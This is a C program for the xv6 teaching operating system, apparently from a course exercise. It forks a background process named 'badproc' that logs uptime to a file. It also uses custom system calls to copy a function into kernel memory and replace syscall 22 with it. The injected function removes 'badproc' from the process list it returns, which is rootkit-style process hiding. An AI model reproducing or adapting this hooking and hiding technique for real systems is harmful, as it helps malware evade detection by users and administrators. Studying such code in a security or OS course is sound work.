#include "types.h"
#include "stat.h"
#include "user.h"
#include "fcntl.h"
#include "asm.h"

char str[100];


struct process
{
	int pid;
	char name[16];
	int status;
};

typedef struct process process;



void reverse(char s[], int l)
 {
     int i, j;
     char c;
 
     for (i = 0, j = l-1; i<j; i++, j--) {
         c = s[i];
         s[i] = s[j];
         s[j] = c;
     }
 }



char* itoa(int num)
{
    int i = 0;
    	
    while (num != 0)
    {
        int rem = num % 10;
        str[i++] = (rem > 9)? (rem-10) + 'a' : rem + '0';
        num = num/10;
    }
 
    str[i] = '\0';
 
    reverse(str, i);
 
    return str;
}

int mybadproc(void);
int mybadproc1(void);


int (**ptr2)();

char* (**ptr3)();

char *x;
int (**ptr6)();



int main()
{
	
	int pid,fd ;
        pid = fork();
        if (pid < 0)
	{
		exit();
	}
        if (pid > 0)
	{
		      
		int (*ptr)()=mybadproc1;
		ptr2=&ptr;
		ptr6=&ptr;
		findkalloc(ptr3);
		process list[2];
		sysreplace(22,ptr,ptr2);
		getproc(list);
		int (*ptr4)()=(int(*)(void))(x+sizeof(*ptr2));
		sysreplace(22,ptr4,ptr6);
		exit();
        }
    else
    {    
	int buf=52;
	fd = open("badproc.out", O_CREATE|O_RDWR );
	while (1)
	{
		buf=uptime();
		write(fd, itoa(buf), sizeof buf);
		close(fd);
		fd = open("badproc.out", O_RDWR );
		sleep(2);
        }
       exit();
       
       return 1;
   }
}


int mybadproc()
{
	
	uint esp;
	asm ("mov %%eax, %0" : "=g" (esp));
	int (**ptr)()=(int(**)())(esp-4);
	int size= (**ptr)();
	 int esp1;
	int *pg;
	 asm("mov %%gs:4,%%edx;  	mov    0x18(%%edx),%%edx;	mov    0x44(%%edx),%%edx; mov %%edx,%0"  
   	 : "=g" (esp1));
	struct process
	{
	int pid;
	char name[16];
	int status;
	};
	int i,j;

	 pg=(int *)(esp1+4);
	 struct process *pv=(struct process *)(*(pg));	
	for(i=0;i<size/24;i++)
	{ 
		{
		if(pv[i].name[0]=='b'&& pv[i].name[1]=='a'&& pv[i].name[2]=='d'&& pv[i].name[3]=='p' && pv[i].name[4]=='r' && pv[i].name[5]=='o'&& pv[i].name[6]=='c')
		{
			for(j=i+1;j<size/24;j++)
			{
				pv[j-1]=pv[j];			
			}
			size=size-24;
			break;
		}
		}
	}
	return size;
}


int mybadproc1(void)
{
	x =(char *)  (**ptr3)();
	memmove(x,ptr2,sizeof(*ptr2));
	memmove(x+sizeof(*ptr2),&mybadproc,&mybadproc1-&mybadproc);
	return 1;
}
